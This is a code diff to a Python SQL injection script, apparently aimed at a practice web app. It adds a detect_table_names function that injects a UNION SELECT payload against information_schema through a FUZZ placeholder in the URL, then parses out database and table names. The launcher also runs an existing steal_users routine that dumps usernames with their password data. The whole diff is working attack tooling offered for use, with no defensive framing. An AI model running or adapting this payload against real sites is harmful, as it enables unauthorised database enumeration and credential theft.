@@ -4,6 +4,7 @@ import sys
 from termcolor import colored
 import getopt
 import re
+from collections import defaultdict
 
 def banner():
     print("\n********************")
@@ -74,6 +75,13 @@ def launcher(url, diction):
     users = steal_users(url)
     for user in users:
         print(user, users[user])
+    databases = detect_table_names(url)
+    for base in databases:
+        print(colored('---------------------------------', 'blue'))
+        print(colored(base,'blue'))
+        print(colored('---------------------------------', 'blue'))
+        [print(table) for table in databases[base]]
+
 
 
 
@@ -139,6 +147,21 @@ def steal_users(url):
     #    print(result.group(1))
         users_data[result[0]] = result[1]
     return users_data
+
+def detect_table_names(url):
+    injection = "-1'union select table_schema,table_name from information_schema.tables WHERE table_schema!='mysql'AND " \
+                "table_schema!='information_schema'AND table_schema!='performance_schema'-- -"
+    new_url = url.replace("FUZZ",injection)
+    req = requests.get(new_url)
+    search_pattern = re.compile(r'Name: ([a-z]+?)<br />[a-z]+: ([a-z0-9_]+)')
+    result_of_parse = search_pattern.findall(req.text)
+    databases = defaultdict(list)
+    for name,tables in result_of_parse:
+        if tables not in databases[name]:
+            databases[name].append(tables)
+        else:
+            pass
+    return databases
 
 if __name__ == "__main__":
     try:
